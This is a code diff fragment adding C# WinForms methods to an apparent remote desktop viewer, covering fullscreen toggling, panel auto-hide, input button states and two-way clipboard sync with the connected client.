+                color.R * color.R * 0.299 +
+                color.G * color.G * 0.587 +
+                color.B * color.B * 0.114);
+
+            return brightness > 130 ? Color.Black : Color.White;
+        }
+
+        #endregion Remote Desktop Configuration
+
+        /// <summary>
+        /// Updates the visual state of the input buttons based on current input settings
+        /// </summary>
+        private void UpdateInputButtonsVisualState()
+        {
+            UpdateButtonState(btnMouse, _enableMouseInput);
+            UpdateButtonState(btnKeyboard, _enableKeyboardInput);
+            UpdateButtonState(btnBiDirectionalClipboard, _enableBidirectionalClipboard);
+            UpdateButtonState(enableGPU, _useGPU);
+        }
+
+        private void UpdateButtonState(Button button, bool enabled)
+        {
+            if (enabled)
+            {
+                button.BackColor = Color.FromArgb(0, 120, 0); // Dark green
+                button.FlatAppearance.BorderColor = Color.LimeGreen;
+            }
+            else
+            {
+                button.BackColor = Color.FromArgb(40, 40, 40); // Default dark
+                button.FlatAppearance.BorderColor = Color.Gray;
+            }
+        }
+
+        private void btnHide_Click(object sender, EventArgs e)
+        {
+            TogglePanelVisibility(false);
+
+            // Ensure hide timer runs after user hides the panel
+            _showButtonHideTimer.Stop();
+            _showButtonHideTimer.Start();
+        }
+
+        private void btnShow_Click(object sender, EventArgs e)
+        {
+            TogglePanelVisibility(true);
+        }
+
+        private void btnStartProgramOnDisplay_Click(object sender, EventArgs e)
+        {
+            int currentDisplayIndex = cbMonitors.SelectedIndex;
+            FrmOpenApplicationOnMonitor frm = new FrmOpenApplicationOnMonitor(_connectClient, currentDisplayIndex);
+            frm.ShowDialog(this);
+        }
+
+        // FULLSCREEN TOGGLE
+        private void ToggleFullscreen()
+        {
+            if (!_isFullscreen)
+            {
+                _restoreBounds = this.Bounds;
+                _restoreBorder = this.FormBorderStyle;
+
+                this.FormBorderStyle = FormBorderStyle.None;
+                this.WindowState = FormWindowState.Normal;
+
+                // Move to current monitor (the monitor the window is on)
+                var screen = Screen.FromControl(this);
+                this.Bounds = screen.Bounds;
+
+                _isFullscreen = true;
+            }
+            else
+            {
+                this.FormBorderStyle = _restoreBorder;
+                this.Bounds = _restoreBounds;
+
+                _isFullscreen = false;
+            }
+
+            // Ensure layout recalculates for picDesktop
+            UpdateDesktopLayout();
+        }
+
+        private void btnBiDirectionalClipboard_Click(object sender, EventArgs e)
+        {
+            _enableBidirectionalClipboard = !_enableBidirectionalClipboard;
+
+            UpdateInputButtonsVisualState();
+
+            // Server-side clipboard monitor only controls server->client sync
+            _clipboardMonitor.IsEnabled = _enableBidirectionalClipboard;
+            Debug.WriteLine(_clipboardMonitor.IsEnabled ? "Server->Client clipboard sync enabled." : "Server->Client clipboard sync disabled.");
+
+            SetClientClipboardSync(_enableBidirectionalClipboard);
+
+            if (_enableBidirectionalClipboard)
+            {
+                Thread clipboardThread = new Thread(() =>
+                {
+                    try
+                    {
+                        Thread.CurrentThread.SetApartmentState(ApartmentState.STA);
+
+                        if (Clipboard.ContainsText())
+                        {
+                            string clipboardText = Clipboard.GetText();
+                            if (!string.IsNullOrEmpty(clipboardText))
+                            {
+                                Debug.WriteLine($"Sending initial clipboard: {clipboardText.Substring(0, Math.Min(20, clipboardText.Length))}...");
+                                _connectClient.Send(new SendClipboardData { ClipboardText = clipboardText });
+                            }
+                        }
+                    }
+                    catch (Exception ex)
+                    {
+                        Debug.WriteLine($"Error sending initial clipboard: {ex.Message}");
+                    }
+                });
+                clipboardThread.SetApartmentState(ApartmentState.STA);
+                clipboardThread.Start();
+            }
+        }
+
+        private void SetClientClipboardSync(bool enabled)
+        {
+            try
+            {
+                if (_connectClient != null)
+                {
+                    _connectClient.ClipboardSyncEnabled = enabled;
+                }
+
+                _connectClient?.Send(new SetClipboardMonitoringEnabled { Enabled = enabled });
+                Debug.WriteLine(enabled
+                    ? "Requested client clipboard sync enable."
+                    : "Requested client clipboard sync disable.");
+            }
+            catch (Exception ex)
+            {
+                Debug.WriteLine($"Failed to update client clipboard sync state: {ex.Message}");
+            }
+        }
+
+        protected override bool ProcessCmdKey(ref Message msg, Keys keyData)
+        {
+            // ESC exits fullscreen
+            if (keyData == Keys.Escape && _isFullscreen)
+            {
+                ToggleFullscreen();
+                return true; // handled
+            }
+
+            // F11 toggles fullscreen
+            if (keyData == Keys.F11)
+            {
+                ToggleFullscreen();
+                return true; // handled
+            }
+
+            return base.ProcessCmdKey(ref msg, keyData);
+        }
+
+        private void panelTop_Paint(object sender, PaintEventArgs e)
+        {
+
+        }
+
+        private void panelDrawingTools_Paint(object sender, PaintEventArgs e)
+        {
+
+        }
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+            ToggleFullscreen();
+        }
+
+        // ======== SHOW BUTTON AUTO-HIDE / HOVER LOGIC ========
+
+        private void Frm_MouseMove(object sender, MouseEventArgs e)
+        {
+            // Convert to form client coordinates
+            Point clientPos = e.Location;
+            if (sender is Control c && c != this)
+            {
+                clientPos = this.PointToClient(c.PointToScreen(e.Location));
+            }
+
+            int hoverZoneHeight = 40; // top 40px area
+            bool isHoveringTop = clientPos.Y <= hoverZoneHeight;
+
+            if (isHoveringTop && !panelTop.Visible)
+            {
+                _mouseHoveringTopArea = true;
+                ShowShowButton();
+            }
+            else
+            {
+                _mouseHoveringTopArea = false;
+
+                if (_showButtonVisible)
+                {
+                    _showButtonHideTimer.Stop();
+                    _showButtonHideTimer.Start();
+                }
+            }
+        }
+
+        private void HideShowButton()
+        {
+            if (!_showButtonVisible)
+                return;
+
+            _showButtonVisible = false;
+            btnShow.Visible = false;
+        }
+
+        private void ShowShowButton()
+        {
+            if (_showButtonVisible)
+                return;
+
+            _showButtonVisible = true;
+            btnShow.Visible = true;
+
+            // Restart timer so it hides again after a delay
+            _showButtonHideTimer.Stop();
+            _showButtonHideTimer.Start();
+        }
+    }
+}
